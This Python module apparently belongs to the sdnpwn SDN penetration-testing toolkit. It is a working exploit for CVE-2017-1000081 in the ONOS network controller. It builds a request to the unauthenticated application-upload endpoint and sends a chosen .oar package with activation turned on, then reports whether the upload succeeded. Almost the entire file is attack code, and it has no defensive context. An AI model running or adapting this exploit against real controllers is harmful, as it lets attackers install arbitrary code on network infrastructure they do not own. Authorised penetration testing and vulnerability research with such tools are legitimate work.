
import signal
import requests
import socket

import modules.sdnpwn_common as sdnpwn

def signal_handler(signal, frame):
  #Handle Ctrl+C here
  print("")
  sdnpwn.message("Stopping...", sdnpwn.NORMAL)
  exit(0)

def info():
  return "Uploads an application to ONOS without authentication by exploiting CVE-2017-1000081."
  
def usage():
  
  sdnpwn.addUsage(["-t", "--target"], "ONOS IP", True)
  sdnpwn.addUsage(["-p", "--port"], "ONOS web UI port (default 8181)", False)
  sdnpwn.addUsage(["-a", "--app"], "Location of application to upload. Expects '.oar' file-type.", True)
  
  return sdnpwn.getUsage()

def run(params):

  signal.signal(signal.SIGINT, signal_handler) #Assign the signal handler
  
  target = ""
  app = ""
  
  target = sdnpwn.getArg(["-t", "--target"], params)  
  port = sdnpwn.getArg(["-p", "--port"], params, "8181")
  app = sdnpwn.getArg(["-a", "--app"], params)
  
  
  if(target == None or app == None):
    sdnpwn.printWarning("Missing required parameter.")
    exit(0)
  
  sdnpwn.printNormal("Attempting unauthenticated app upload (CVE-2017-1000081)")
  
  url = "http://" + target + ":" + str(port) + "/onos/ui/rs/applications/upload?activate=true"
  
  response = requests.post(url, files={'file': open(app, 'rb')})
  
  if(response.status_code == 200):
    sdnpwn.printSuccess("Got 200 OK - Application uploaded and activiated!")
  else:
    sdnpwn.printWarning("Got " + str(response.status_code))
  